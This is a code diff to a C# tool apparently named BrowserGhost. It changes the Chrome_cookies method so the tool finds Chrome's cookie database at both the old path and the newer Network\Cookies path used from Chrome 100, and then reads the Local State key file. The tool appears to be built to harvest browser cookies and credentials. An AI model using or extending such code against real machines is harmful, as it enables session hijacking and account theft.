@@ -352,7 +352,16 @@ namespace BrowserGhost
 
         public static bool Chrome_cookies()
         {
-            string chrome_cookie_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Cookies";
+            string chrome_cookie_path = "";
+            string chrome_pre100_cookie_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Cookies";
+            string chrome_100plus_cookie_path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Network\Cookies";
+            if (File.Exists(chrome_pre100_cookie_path) == true)
+            {
+                chrome_cookie_path = chrome_pre100_cookie_path;
+            } else if (File.Exists(chrome_100plus_cookie_path) == true)
+            {
+                chrome_cookie_path = chrome_100plus_cookie_path;
+            }
             if (File.Exists(chrome_cookie_path) == true)
             {
                 string chrome_state_file = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Local State";
